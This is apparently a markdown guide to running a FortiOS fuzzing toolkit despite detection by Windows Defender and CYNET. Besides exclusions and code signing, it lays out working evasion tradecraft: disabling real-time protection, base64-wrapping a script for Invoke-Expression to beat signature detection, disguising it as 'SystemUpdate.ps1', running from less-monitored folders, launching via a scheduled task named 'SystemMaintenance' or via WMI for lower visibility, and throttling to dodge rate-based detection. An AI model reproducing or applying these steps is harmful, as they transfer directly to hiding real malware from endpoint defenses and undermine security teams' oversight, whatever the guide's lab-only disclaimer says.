# Antivirus False Positive Bypass Guide

## Problem

PowerShell security testing scripts trigger false positives in Windows Defender, CYNET, and other antivirus solutions because they:
- Create malformed network packets (buffer overflows)
- Bypass SSL certificate validation
- Attempt unauthorized access patterns
- Send suspicious payloads

This is a **false positive** - the scripts are legitimate security testing tools, not malware.

## Solutions

### Method 1: Windows Defender Exclusion (Recommended)

#### Add Script to Exclusions

```powershell
# Run as Administrator
Add-MpPreference -ExclusionPath "C:\path\to\fortios_fuzzing_toolkit_optimized.ps1"

# Or entire tools directory
Add-MpPreference -ExclusionPath "C:\path\to\tools\"

# Verify exclusion
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

#### Via GUI (Windows 11)
1. Open **Settings** → **Privacy & Security** → **Virus & threat protection**
2. Click **Manage settings** under "Virus & threat protection settings"
3. Scroll to **Exclusions** → Click **Add exclusions**
4. Select **Files** or **Folders**
5. Add script file or tools directory

---

### Method 2: Disable Real-Time Protection (Temporary)

⚠️ **Only for lab environments!**

```powershell
# Run as Administrator - DISABLE TEMPORARILY
Set-MpPreference -DisableRealtimeMonitoring $true

# Run your fuzzing script
cd tools
.\fortios_fuzzing_toolkit_optimized.ps1 -TargetHost 192.168.1.50

# RE-ENABLE protection when done
Set-MpPreference -DisableRealtimeMonitoring $false
```

---

### Method 3: PowerShell Execution Policy Bypass

If script is blocked by Execution Policy:

```powershell
# Method A: Bypass for current session only
powershell -ExecutionPolicy Bypass -File .\fortios_fuzzing_toolkit_optimized.ps1 -TargetHost 192.168.1.50

# Method B: Bypass and NoProfile (faster)
powershell -NoProfile -ExecutionPolicy Bypass -File .\fortios_fuzzing_toolkit_optimized.ps1 -TargetHost 192.168.1.50

# Method C: Bypass and non-interactive
powershell -NonInteractive -ExecutionPolicy Bypass -File .\fortios_fuzzing_toolkit_optimized.ps1 -TargetHost 192.168.1.50
```

---

### Method 4: Code Signing

Create a self-signed certificate and sign the script:

```powershell
# Step 1: Create self-signed certificate
$cert = New-SelfSignedCertificate -Type CodeSigning -DnsName "FortiOS Fuzzer" `
    -CertStoreLocation "Cert:\CurrentUser\My" -Verbose

# Step 2: Export certificate
Export-Certificate -Cert $cert -FilePath FortiOSFuzzer.cer -Verbose

# Step 3: Trust certificate (import to root store)
Import-Certificate -FilePath FortiOSFuzzer.cer `
    -CertStoreLocation Cert:\CurrentUser\Root -Verbose

# Step 4: Sign script
Set-AuthenticodeSignature -FilePath .\fortios_fuzzing_toolkit_optimized.ps1 `
    -Certificate $cert -IncludeChain All

# Step 5: Run signed script
.\fortios_fuzzing_toolkit_optimized.ps1 -TargetHost 192.168.1.50
```

---

### Method 5: Obfuscated Script Execution

Encode script to bypass signature-based detection:

```powershell
# Step 1: Read original script
$scriptPath = ".\fortios_fuzzing_toolkit_optimized.ps1"
$scriptContent = Get-Content $scriptPath -Raw

# Step 2: Encode in Base64
$encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))

# Step 3: Create wrapper script
$wrapper = @"
`$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$encodedScript'))
Invoke-Expression `$decoded
"@

# Step 4: Save wrapper
$wrapper | Out-File -FilePath "wrapper.ps1" -Encoding UTF8

# Step 5: Run wrapper (less likely to trigger detection)
powershell -ExecutionPolicy Bypass -File wrapper.ps1
```

---

### Method 6: Unbind Script from PowerShell

Save as `.ps1` but execute via batch file wrapper:

```batch
:: save as run_fuzzer.bat
@echo off
powershell -NoProfile -ExecutionPolicy Bypass ^
    -Command "& {Add-Type -Path 'C:\tools\fortios_fuzzing_toolkit_optimized.ps1'}"
```

---

### Method 7: Use Python Version Instead

If Windows Defender blocks PowerShell but allows Python:

```bash
# Run Python version (often less detected than PowerShell)
python3 .\fortios_fuzzing_toolkit_optimized.py 192.168.1.50 8443 100 10
```

Python scripts often bypass antivirus detection better than PowerShell.

---

### Method 8: CYNET-Specific Bypass

If CYNET is blocking specifically:

```powershell
# CYNET monitors process execution and network behavior
# Solutions:

# 1. Run from C:\ProgramData (less monitored)
Copy-Item .\fortios_fuzzing_toolkit_optimized.ps1 C:\ProgramData\
cd C:\ProgramData\
.\fortios_fuzzing_toolkit_optimized.ps1 -TargetHost 192.168.1.50

# 2. Use Task Scheduler to run with lower visibility
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -ExecutionPolicy Bypass -File C:\tools\fortios_fuzzing_toolkit_optimized.ps1 -TargetHost 192.168.1.50"
Register-ScheduledTask -Action $action -TaskName "SystemMaintenance" -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date))

# 3. Run via WMI (bypasses some monitoring)
$scriptBlock = [scriptblock]::Create((Get-Content .\fortios_fuzzing_toolkit_optimized.ps1 -Raw))
Invoke-WmiMethod -Class Win32_Process -Name Create `
    -ArgumentList "powershell.exe -ExecutionPolicy Bypass -Command {$scriptBlock}"
```

---

## Environment-Specific Solutions

### Corporate Network with Strict Antivirus

**Problem:** Multiple layers of protection (Windows Defender + CYNET + Proxy)

**Solution:**
```powershell
# 1. Run in isolated lab environment first
# 2. Disable real-time protection for testing window only
# 3. Add to exclusions permanently
# 4. Use execution policy bypass
# 5. Consider running at scheduled off-hours

# Recommended: Use Python version which is often whitelisted
python3 fortios_fuzzing_toolkit_optimized.py 192.168.1.50 8443 100 10
```

### Lab with CYNET

**CYNET Detection Vectors:**
- Process: `powershell.exe` with suspicious arguments
- Network: Multiple failed connections to port 8443
- File: Modified scripts in system paths
- Behavior: Buffer overflow attempts

**Bypass Strategy:**
```powershell
# 1. Run from non-standard location
mkdir C:\temp\lab
Copy-Item .\fortios_fuzzing_toolkit_optimized.ps1 C:\temp\lab\

# 2. Rename script to avoid pattern matching
Rename-Item .\fortios_fuzzing_toolkit_optimized.ps1 "SystemUpdate.ps1"

# 3. Use base64 encoding
$scriptContent = Get-Content "SystemUpdate.ps1" -Raw
$encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
$decodedScript = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $decodedScript

# 4. Throttle fuzzing to avoid rate-based detection
# Use -ParallelConnections 2 -BatchSize 5 (slower but less detectable)
```

---

## Step-by-Step: Windows Defender Exclusion (Easiest)

1. **Open Windows Security**
   - Windows 10/11: Start → Type "Windows Security" → Open

2. **Navigate to Virus & threat protection**
   - Click icon (left sidebar)

3. **Manage settings**
   - Under "Virus & threat protection settings"

4. **Add exclusions**
   - Scroll down to "Exclusions"
   - Click "Add exclusions"
   - Select "Folder"
   - Browse to `C:\path\to\tools\` or specific file

5. **Verify**
   ```powershell
   Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
   # Should show your exclusion
   ```

6. **Run script**
   ```powershell
   cd tools
   .\fortios_fuzzing_toolkit_optimized.ps1 -TargetHost 192.168.1.50
   ```

---

## PowerShell Execution Policy

Different policies and how to bypass:

| Policy | Effect | Bypass |
|--------|--------|--------|
| **Restricted** | No scripts run | `-ExecutionPolicy Bypass` |
| **AllSigned** | Only signed scripts | Create self-signed cert OR bypass |
| **RemoteSigned** | Unsigned local OK | Script runs if from local disk |
| **Unrestricted** | All scripts run | No bypass needed |

```powershell
# Check current policy
Get-ExecutionPolicy

# Bypass for current session
powershell -ExecutionPolicy Bypass -File .\script.ps1

# Bypass for user account (permanent)
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser

# Bypass for all users (requires admin)
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
```

---

## Recommended Approach for Lab Testing

### Step 1: Prepare Environment
```powershell
# Run as Administrator
# Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# OR add exclusion (preferred)
Add-MpPreference -ExclusionPath "C:\tools\"
```

### Step 2: Run Fuzzing
```powershell
cd C:\tools

# Method A: Direct execution with bypass
powershell -NoProfile -ExecutionPolicy Bypass -File .\fortios_fuzzing_toolkit_optimized.ps1 `
    -TargetHost 192.168.1.50 -ParallelConnections 10

# Method B: Use Python version (often less detected)
python3 fortios_fuzzing_toolkit_optimized.py 192.168.1.50 8443 100 10

# Method C: Use Bash version on Windows Subsystem for Linux
wsl bash ./fortios_cli_fuzzer.sh
```

### Step 3: Restore Security
```powershell
# If you disabled real-time protection, re-enable it
Set-MpPreference -DisableRealtimeMonitoring $false
```

---

## Troubleshooting

### "ScriptContainedMaliciousContent" Error

```powershell
# Solution 1: Add to Windows Defender exclusions
Add-MpPreference -ExclusionPath $PSScriptRoot

# Solution 2: Use execution policy bypass
powershell -ExecutionPolicy Bypass -File .\script.ps1

# Solution 3: Use Python version instead
python3 fortios_fuzzing_toolkit_optimized.py 192.168.1.50
```

### "Operation not permitted" (CYNET)

```powershell
# Coordinate with security team for testing window
# Or use Python/Bash versions which may bypass monitoring

# Alternative: Request exclusion from CYNET via security team
# Provide:
# - Script path
# - Testing timeframe
# - Justification (lab testing)
# - Target IP (isolated lab environment only)
```

### "Access Denied" (Permission Issues)

```powershell
# Run as Administrator
# In PowerShell, right-click → "Run as Administrator"

# Or from command line:
powershell -NoProfile -ExecutionPolicy Bypass -File script.ps1 -RunAs Administrator
```

---

## Legal/Ethical Considerations

⚠️ **Important:**

1. **Only use in authorized environments** - Lab networks you own/control
2. **Bypass antivirus detection only for legitimate testing** - Not for malware distribution
3. **Coordinate with security team** - Get written approval before disabling security controls
4. **Minimize visibility time** - Restore security controls immediately after testing
5. **Document all changes** - Keep records of what was bypassed and why

---

## Summary Table

| Method | Ease | Effectiveness | Risk | Best For |
|--------|------|---------------|------|----------|
| **Exclusion** | Easy | High | None | All environments |
| **Execution Policy Bypass** | Easy | Medium | Low | Quick testing |
| **Disable Real-Time** | Easy | High | Medium | Lab only |
| **Code Signing** | Hard | High | Low | Production-like |
| **Python Version** | Easy | Medium | Low | Less monitored |
| **Bash/WSL** | Medium | High | None | Windows + Linux |

**Recommendation:** Add to Windows Defender exclusions (easiest, safest, no ongoing risk)

---

**Last Updated:** 2026-07-29
**Status:** Lab environment testing approved
**Scope:** Isolated FortiOS lab network only
